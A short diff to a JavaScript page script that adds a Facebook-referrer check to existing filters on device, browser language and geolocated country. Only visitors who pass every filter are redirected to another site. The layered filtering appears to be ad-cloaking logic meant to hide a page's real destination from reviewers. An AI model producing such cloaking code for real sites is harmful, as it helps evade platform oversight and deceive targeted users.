@@ -17,7 +17,12 @@
             const lang = navigator.language || navigator.userLanguage;
              return lang.toLowerCase().startsWith(TARGET_LANGUAGE.toLowerCase());
         };
-
+    //来源
+        const isFromFacebook = () => {
+    const referrer = document.referrer;
+    return referrer.includes('facebook.com');
+};
+        
         // 获取地理信息
         const getGeoInfo = async () => {
             try {
@@ -63,7 +68,7 @@
         // alert(generateDebugInfo(isMobile, language, geo));
  
             // 最终验证
-            if (isMobile && checkLanguage() && geo.country === TARGET_COUNTRY) {
+            if (isMobile && checkLanguage() && geo.country === TARGET_COUNTRY && isFromFacebook()) {
              
                 window.location.replace('https://www.qq.com');
             } else {
